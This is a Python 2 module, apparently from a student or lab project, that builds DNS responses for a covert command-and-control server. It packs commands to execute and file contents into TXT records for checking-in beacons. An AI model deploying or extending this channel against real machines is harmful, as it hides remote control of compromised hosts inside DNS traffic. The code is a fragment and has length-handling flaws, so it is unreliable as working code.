"""
    File containing classes and functions to handle a DNS Response
    @author Dosh, JRoc
"""
import struct, sqlite3, zlib

"""
    Class to represent a DNS Response and functions to build it
"""
class DNSResponse:
    """
        Init function to create the class
        
        addr - the address to send the packet too.
        txt - boolean value whether it's a txt record or not      
        server - the server sending the query
    """
    def __init__(self, addr, txt, server):
        self.addr = addr
        self.packet = None
        self.txt = txt
        self.commands = server.commands     # commands to execute
        self.f = server.f   # if file is present
        self.fName = server.fName   # name of file
        self.server = server

    """
        Packs data into a binary struct to send as a
        response to the original query.

        url - the address of the answer
        qID - the queryID of the origina query
    """
    def create_packet(self, url, qID):
        self.packet = struct.pack("!H", qID) # Q ID
        self.packet += struct.pack("!H", 34176) # Flags
        self.packet += struct.pack("!H", 1) # Questions
        self.packet += struct.pack("!H", 1) # Answers
        self.packet += struct.pack("!H", 0) # Authorities
        self.packet += struct.pack("!H", 0) # Additional
        tmp_url = url.split(".")
        for x in tmp_url:
            self.packet += struct.pack("B", len(x)) # Store length of name
            self.packet += ''.join(struct.pack("c", byte) for byte in bytes(x)) # Loop & store name
        self.packet += struct.pack("B", 0) # Terminate name
        if self.txt:
            self.packet += struct.pack("!H", 16) # Q TXT Type
        else:
            self.packet += struct.pack("!H", 1) # Q A Type
        self.packet += struct.pack("!H", 1) # Q Class
        self.create_answer(url)

    """
        Creates the answer section of the DNS response

        record - the record to include in the name section
    """
    def create_answer(self, record):
        tmp_record = record.split(".")
        for x in tmp_record:
            self.packet += struct.pack("B", len(x)) # Store length of name
            self.packet += ''.join(struct.pack("c", byte) for byte in bytes(x)) # Loop & store name
        self.packet += struct.pack("B", 0) # Terminate name
        if self.txt:
            self.packet += struct.pack("!H", 16) # TXT type, 2 bytes
        else:
            self.packet += struct.pack("!H", 1) # A Type 2 bytes
        self.packet += struct.pack("!H", 1) # Class 2 bytes
        self.packet += struct.pack("!I", 1) # TTL 4 bytes
        if self.txt:    # load command
            if self.f:
                self.load_file(self.fName)
                self.server.f = False
                self.server.fName = None
            else:
                full = ';'.join(cmd for cmd in self.commands) # concat commands with semicolon
                length = len(full)
                self.packet += struct.pack("!H", length + 1) # RDLENGTH(cmd length) + txt length field
                self.packet += struct.pack("B", length) # TXT Length(cmd lengths)
                self.packet += ''.join(struct.pack("c", x) for x in full) # loop & store command
        else:   # load IP for A record
            self.packet += struct.pack("!H", 4) # RDLENGTH 2 bytes
            self.packet += struct.pack("!I", 2165670612)  # RDATA, should be IP address from A record
        

    """
        Loads the data from a file into the DNS packet,
        fragmenting it if the packet is too large

        f - the name of the file to open
    """
    def load_file(self, f):
        f = open(f, 'rb')
        f.seek(0, 2) # go to end of file
        size = f.tell() # get size of file
        f.seek(0) # back to beginning of file
        self.packet += struct.pack("!H", size + 1) # RDLENGTH(file length) + txt length field
        self.packet += struct.pack("B", size) # TXT Length(file length)
        l = f.read(1)
        while l:
            print l
            self.packet += struct.pack("c", l) # load each byte of the packet
            l = f.read(1)
        f.close()
        

"""
    Function to answer a DNS query with the correct record.

    addr - the address to send the response to
    server - the class representing the mini dns server
    dnsQuery - the class represnting the query being answered
    txt - boolean value for if its a txt record or not
"""
def send_response(addr, server, dnsQuery, txt):
    print "Sending response"
    response = DNSResponse(addr, txt, server)
    response.create_packet(dnsQuery.fullNames[0], dnsQuery.qID)
    print addr
    server.sock.sendto(bytes(response.packet), addr)
    if dnsQuery.checkin: server.add_beacon(addr)
    print "Response sent"
